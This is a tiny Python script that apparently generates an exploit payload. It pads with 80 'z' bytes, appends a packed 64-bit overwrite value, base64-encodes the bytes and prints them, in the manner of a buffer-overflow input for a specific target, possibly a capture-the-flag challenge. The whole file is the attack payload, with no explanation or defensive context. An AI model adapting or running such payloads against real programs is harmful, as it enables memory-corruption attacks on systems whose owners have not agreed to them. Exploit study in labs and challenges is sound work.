
import sys
import struct
import base64

buf = b'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz'
buf += struct.pack('<Q', 9701709071040531021)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
